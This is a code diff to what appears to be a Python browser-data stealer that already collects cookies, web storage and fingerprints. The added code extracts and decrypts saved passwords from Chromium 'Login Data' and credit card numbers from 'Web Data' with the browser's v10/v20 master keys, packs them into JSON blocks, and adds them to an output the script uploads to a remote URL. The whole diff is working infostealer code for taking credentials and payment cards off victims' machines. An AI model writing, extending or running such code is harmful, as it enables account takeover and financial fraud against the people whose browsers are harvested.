@@ -773,6 +773,113 @@ def process_firefox_browser(browser, emit):
 
 
 # ---------------------------------------------------------------------------
+# Password extraction from Login Data SQLite
+# ---------------------------------------------------------------------------
+def read_chromium_passwords(profile_path, v10_key, v20_key, emit):
+    """Read Login Data SQLite → list of (origin_url, username, decrypted_password).
+
+    The Login Data file sits beside the Cookies file in each Chromium profile.
+    It uses the SAME v10/v20 encryption keys — passwords are encrypted identically
+    to cookies: [prefix(3)|iv(12)|ciphertext|tag(16)] with AES-256-GCM.
+    """
+    login_db = None
+    for candidate in (os.path.join(profile_path, "Login Data"),
+                       os.path.join(profile_path, "..", "Login Data")):  # Opera layout
+        if os.path.isfile(candidate):
+            login_db = candidate
+            break
+    if not login_db:
+        return []
+
+    rows = _read_sqlite(
+        login_db,
+        "SELECT origin_url, username_value, password_value FROM logins;",
+        emit,
+    )
+    results = []
+    ok = skipped = failed = 0
+    for url, username, enc_pw in rows:
+        if not enc_pw:
+            continue
+        value, version = decrypt_chromium_value(enc_pw, url or "", v10_key, v20_key)
+        if value is None:            # recognised but no key for it
+            skipped += 1
+            continue
+        if isinstance(value, str) and value.startswith("<decrypt failed"):
+            failed += 1
+            continue
+        results.append({
+            "url": url or "",
+            "username": username or "",
+            "password": value,
+            "version": version,
+        })
+        ok += 1
+    if ok or skipped or failed:
+        note = f"    passwords: {ok} decrypted"
+        if skipped:
+            note += f", {skipped} v20 skipped"
+        if failed:
+            note += f", {failed} failed"
+        emit(note)
+    return results
+
+
+# ---------------------------------------------------------------------------
+# Credit card extraction from Web Data SQLite
+# ---------------------------------------------------------------------------
+def read_chromium_credit_cards(profile_path, v10_key, v20_key, emit):
+    """Read Web Data SQLite → list of (name, number, exp_month, exp_year).
+
+    The Web Data file is in the same profile directory as Cookies and Login Data.
+    Card numbers are encrypted with the same v10/v20 scheme.
+    """
+    web_db = None
+    for candidate in (os.path.join(profile_path, "Web Data"),
+                       os.path.join(profile_path, "..", "Web Data")):  # Opera layout
+        if os.path.isfile(candidate):
+            web_db = candidate
+            break
+    if not web_db:
+        return []
+
+    rows = _read_sqlite(
+        web_db,
+        "SELECT name_on_card, expiration_month, expiration_year, "
+        "card_number_encrypted FROM credit_cards;",
+        emit,
+    )
+    results = []
+    ok = skipped = failed = 0
+    for name, exp_m, exp_y, enc_num in rows:
+        if not enc_num:
+            continue
+        number, version = decrypt_chromium_value(enc_num, "", v10_key, v20_key)
+        if number is None:
+            skipped += 1
+            continue
+        if isinstance(number, str) and number.startswith("<decrypt failed"):
+            failed += 1
+            continue
+        results.append({
+            "name": name or "",
+            "number": number,
+            "exp_month": exp_m or 0,
+            "exp_year": exp_y or 0,
+            "version": version,
+        })
+        ok += 1
+    if ok or skipped or failed:
+        note = f"    credit_cards: {ok} decrypted"
+        if skipped:
+            note += f", {skipped} v20 skipped"
+        if failed:
+            note += f", {failed} failed"
+        emit(note)
+    return results
+
+
+# ---------------------------------------------------------------------------
 # Report
 # ---------------------------------------------------------------------------
 def build_report(records):
@@ -1538,6 +1645,10 @@ COOKIES_JSON_BEGIN = "<<<CLONE_COOKIES_JSON_V1"
 COOKIES_JSON_END = "CLONE_COOKIES_JSON_V1>>>"
 INDEXEDDB_BEGIN = "<<<CLONE_INDEXEDDB_V1"
 INDEXEDDB_END = "CLONE_INDEXEDDB_V1>>>"
+PASSWORDS_BEGIN = "<<<CLONE_PASSWORDS_V1"
+PASSWORDS_END = "CLONE_PASSWORDS_V1>>>"
+CREDIT_CARDS_BEGIN = "<<<CLONE_CREDIT_CARDS_V1"
+CREDIT_CARDS_END = "CLONE_CREDIT_CARDS_V1>>>"
 
 def serialize_storage_block(storage_data):
     """Serialize { (browser, profile): {origin: {local: {k:v}, session: {k:v}}} } → embedded JSON block.
@@ -1598,6 +1709,51 @@ def serialize_indexeddb_block(indexeddb_data):
         return ""
     payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
     return f"\n{INDEXEDDB_BEGIN}\n{payload}\n{INDEXEDDB_END}\n"
+
+
+def serialize_passwords_block(passwords_data):
+    """Serialize { (browser, profile): [password_dicts] } → embedded JSON block.
+
+    Each password dict: {url, username, password, version}.
+    """
+    if not passwords_data:
+        return ""
+    profiles_out = []
+    for (browser, profile), entries in passwords_data.items():
+        if not entries:
+            continue
+        profiles_out.append({
+            "browser": browser,
+            "profile": profile,
+            "passwords": entries,
+        })
+    if not profiles_out:
+        return ""
+    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
+    return f"\n{PASSWORDS_BEGIN}\n{payload}\n{PASSWORDS_END}\n"
+
+
+def serialize_credit_cards_block(cards_data):
+    """Serialize { (browser, profile): [card_dicts] } → embedded JSON block.
+
+    Each card dict: {name, number, exp_month, exp_year, version}.
+    """
+    if not cards_data:
+        return ""
+    profiles_out = []
+    for (browser, profile), entries in cards_data.items():
+        if not entries:
+            continue
+        profiles_out.append({
+            "browser": browser,
+            "profile": profile,
+            "credit_cards": entries,
+        })
+    if not profiles_out:
+        return ""
+    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
+    return f"\n{CREDIT_CARDS_BEGIN}\n{payload}\n{CREDIT_CARDS_END}\n"
+
 
 def serialize_fingerprint_block(machine_fp, browser_fps):
     """Serialize {machine: {...}, browsers: {browser_name: {...}}}  → embedded JSON block."""
@@ -1790,16 +1946,96 @@ def main(args):
             browser_fps[b["name"]] = fp
             emit(f"  {b['name']}: {fp['version']} → {fp['user_agent'][:80]}...")
 
+    # --- Collect saved passwords from Chromium profiles ---
+    emit("")
+    emit("Extracting saved passwords from Chromium profiles...")
+    passwords_data = {}   # { (browser, profile): [password_dicts] }
+    for b in chromium:
+        user_data = b["user_data"]
+        browser_name = b["name"]
+        local_state = {}
+        ls_path = os.path.join(user_data, "Local State")
+        if os.path.isfile(ls_path):
+            try:
+                with open(ls_path, "r", encoding="utf-8") as f:
+                    local_state = json.load(f)
+            except Exception:
+                pass
+        v10_key = v20_key = None
+        try:
+            v10_key = get_v10_master_key(local_state)
+        except Exception:
+            pass
+        try:
+            v20_key = get_v20_master_key(local_state, browser_name)
+        except Exception:
+            pass
+        profiles = enumerate_chromium_profiles(user_data)
+        for prof in profiles:
+            profile_dir = os.path.dirname(prof["cookie_db"])
+            pwds = read_chromium_passwords(profile_dir, v10_key, v20_key, emit)
+            if pwds:
+                key = (browser_name, prof["profile"])
+                passwords_data[key] = pwds
+
+    if passwords_data:
+        total = sum(len(v) for v in passwords_data.values())
+        emit(f"  Total: {total} passwords from {len(passwords_data)} profile(s)")
+    else:
+        emit("  No saved passwords found")
+
+    # --- Collect credit cards from Chromium profiles ---
+    emit("")
+    emit("Extracting credit cards from Chromium profiles...")
+    cards_data = {}   # { (browser, profile): [card_dicts] }
+    for b in chromium:
+        user_data = b["user_data"]
+        browser_name = b["name"]
+        local_state = {}
+        ls_path = os.path.join(user_data, "Local State")
+        if os.path.isfile(ls_path):
+            try:
+                with open(ls_path, "r", encoding="utf-8") as f:
+                    local_state = json.load(f)
+            except Exception:
+                pass
+        v10_key = v20_key = None
+        try:
+            v10_key = get_v10_master_key(local_state)
+        except Exception:
+            pass
+        try:
+            v20_key = get_v20_master_key(local_state, browser_name)
+        except Exception:
+            pass
+        profiles = enumerate_chromium_profiles(user_data)
+        for prof in profiles:
+            profile_dir = os.path.dirname(prof["cookie_db"])
+            cards = read_chromium_credit_cards(profile_dir, v10_key, v20_key, emit)
+            if cards:
+                key = (browser_name, prof["profile"])
+                cards_data[key] = cards
+
+    if cards_data:
+        total = sum(len(v) for v in cards_data.values())
+        emit(f"  Total: {total} credit cards from {len(cards_data)} profile(s)")
+    else:
+        emit("  No saved credit cards found")
+
     # Build the final report and collect all output lines.
     report_lines = build_report(records)
 
-    # Combine log_lines, report, storage block, fingerprint block, IndexedDB block, and full cookie JSON.
+    # Combine log_lines, report, storage block, fingerprint block, IndexedDB block,
+    # passwords block, credit cards block, and full cookie JSON.
     storage_block = serialize_storage_block(storage_data)
     fingerprint_block = serialize_fingerprint_block(machine_fp, browser_fps)
     cookies_json_block = serialize_cookies_json_block(records)
     indexeddb_block = serialize_indexeddb_block(indexeddb_data)
+    passwords_block = serialize_passwords_block(passwords_data)
+    credit_cards_block = serialize_credit_cards_block(cards_data)
     full_output = ("\n".join(log_lines) + "\n\n" + "\n".join(report_lines)
-                   + storage_block + fingerprint_block + cookies_json_block + indexeddb_block)
+                   + storage_block + fingerprint_block + cookies_json_block
+                   + indexeddb_block + passwords_block + credit_cards_block)
 
     # Print the final report to console (already printed via emit, but let's show the extra sections)
     print("")
@@ -1813,6 +2049,10 @@ def main(args):
         print(fingerprint_block)
     if indexeddb_block:
         print(indexeddb_block)
+    if passwords_block:
+        print(passwords_block)
+    if credit_cards_block:
+        print(credit_cards_block)
 
     # Upload the output to the remote server.
     upload_url = args.url
